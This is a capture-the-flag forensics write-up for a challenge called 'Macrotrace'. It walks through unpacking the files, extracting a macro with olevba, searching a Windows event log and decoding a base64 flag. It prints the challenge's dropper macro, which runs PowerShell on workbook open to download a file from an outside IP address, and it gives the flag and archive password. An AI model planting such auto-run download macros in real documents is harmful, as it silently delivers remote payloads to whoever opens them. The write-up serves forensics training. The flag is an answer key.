# Macrotrace - Forensics Challenge

## Challenge Overview
- **Category:** Forensics
- **Points:** 100
- **Description:** A suspicious spreadsheet surfaced from the archive of a defunct Flash game studio. Opening it does... something, but whatever was there is now gone.

## Files Provided
- `macrotrace-assets.zip` (password: `23ab3Y9/]jKl`)
  - Contains: `dropper.xlsm` (Excel file with macros)
  - Contains: `flash.evtx` (Windows event log)

## Solution Approach

### 1. Extract the Files
```bash
7z x -p23ab3Y9/]jKl macrotrace-assets.zip
```

### 2. Analyze the Excel Macro
```bash
olevba dropper.xlsm
```

The macro reveals a PowerShell command that runs on workbook open:
```vba
Private Sub Workbook_Open()
    Dim cmd As String
    cmd = "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://34.138.121.94:8000/stage1.txt' -OutFile $env:TEMP\\stage1.txt\""
    Shell cmd
End Sub
```

This shows the macro downloads a file from a remote server when opened.

### 3. Analyze the Windows Event Log
First, convert the event log to XML for easier analysis:
```bash
evtx_dump.py flash.evtx > flash.xml
```

Search for PowerShell activity:
```bash
grep -i ScriptBlockText flash.xml
```

This reveals a suspicious base64 string:
```
$e= "VU1BU1N7ZHJvcF9pdF9saWtlX2l0c19ob3R9"
```

### 4. Decode the Base64 String
```bash
echo 'VU1BU1N7ZHJvcF9pdF9saWtlX2l0c19ob3R9' | base64 -d
```

This reveals the flag: `UMASS{drop_it_like_its_hot}`

## Flag
`UMASS{drop_it_like_its_hot}`